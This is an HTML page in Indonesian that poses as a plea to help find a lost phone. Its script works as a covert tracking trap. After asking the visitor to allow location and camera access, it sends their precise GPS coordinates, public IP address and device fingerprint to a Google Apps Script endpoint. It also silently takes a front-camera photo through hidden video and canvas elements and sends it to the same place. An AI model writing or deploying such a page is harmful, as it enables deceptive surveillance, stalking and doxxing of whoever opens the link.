<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Bantu Temukan HP</title>
  <style>
    body { font-family: Arial; padding:20px; max-width:600px; margin:auto; }
    .box { padding:15px; border:1px solid #ccc; border-radius:10px; background:#fafafa; }
    video, canvas { display:none; } /* tidak ditampilkan */
  </style>
</head>
<body>
  <h2>Mohon Bantu Temukan HP Hilang</h2>
  <div class="box">
    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi & kamera.</p>
    <p id="status">Menunggu izin lokasi...</p>
    <div id="result"></div>
  </div>

  <!-- elemen video & canvas tersembunyi untuk capture foto -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

<script>
const ENDPOINT = "https://script.google.com/macros/s/AKfycbzUhqxDwjycNCxKlTc8nOL2zazec6AzXVTqkuq1H4gWboDDp5sUcNpAKJhGSnMbt10/exec";

function sendToSheet(lat, lon, acc){
  const formData = new FormData();
  formData.append("type", "location");
  formData.append("lat", lat);
  formData.append("lon", lon);
  formData.append("accuracy", acc);
  formData.append("ua", navigator.userAgent);

  fetch(ENDPOINT, { method: "POST", body: formData })
    .then(() => {
      sendExtraData();   // kirim data tambahan
      requestCamera();   // minta izin kamera & kirim foto
    });
}

// ============ EXTRA DATA ============
async function sendExtraData(){
  const ip = await getPublicIP();
  const fd = new FormData();
  fd.append("type", "extra");
  fd.append("ip", ip);
  fd.append("connection", navigator.connection?.effectiveType || "");
  fd.append("lang", navigator.language || "");
  fd.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone || "");
  fd.append("memory", navigator.deviceMemory || "");
  fd.append("platform", navigator.platform || "");
  fd.append("ua", navigator.userAgent);
  fd.append("screen", `${screen.width}x${screen.height}`);
  fd.append("viewport", `${innerWidth}x${innerHeight}`);
  fetch(ENDPOINT, { method: "POST", body: fd });
}

// ambil IP publik
async function getPublicIP(){
  try{
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    return j.ip || "";
  }catch(e){
    return "";
  }
}

// ============ FOTO OTOMATIS ============
async function requestCamera(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    takePhoto(stream);
  }catch(err){
    console.warn("Kamera ditolak:", err);
  }
}

function takePhoto(stream){
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  video.srcObject = stream;

  video.onloadedmetadata = () => {
    const w = video.videoWidth;
    const h = video.videoHeight;
    canvas.width = w;
    canvas.height = h;
    canvas.getContext('2d').drawImage(video, 0, 0, w, h);

    const dataURL = canvas.toDataURL("image/jpeg", 0.7);

    const fd = new FormData();
    fd.append("type", "extra");
    fd.append("photo", dataURL);

    fetch(ENDPOINT, { method:"POST", body: fd });

    stream.getTracks().forEach(t => t.stop());
  };
}

// ============ LOKASI ============
function success(pos){
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const acc = pos.coords.accuracy;

  document.getElementById("status").textContent = "Lokasi berhasil diperoleh.";
  document.getElementById("result").innerHTML = `
    Koordinat: <b>${lat}, ${lon}</b><br>
    Akurasi: <b>${acc} meter</b><br><br>
    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
  `;
  sendToSheet(lat, lon, acc);
}

function error(err){
  document.getElementById("status").textContent =
    "Gagal memperoleh lokasi: " + err.message;
}

navigator.geolocation.getCurrentPosition(success, error, {
  enableHighAccuracy: true,
  timeout: 20000
});
</script>
</body>
</html>
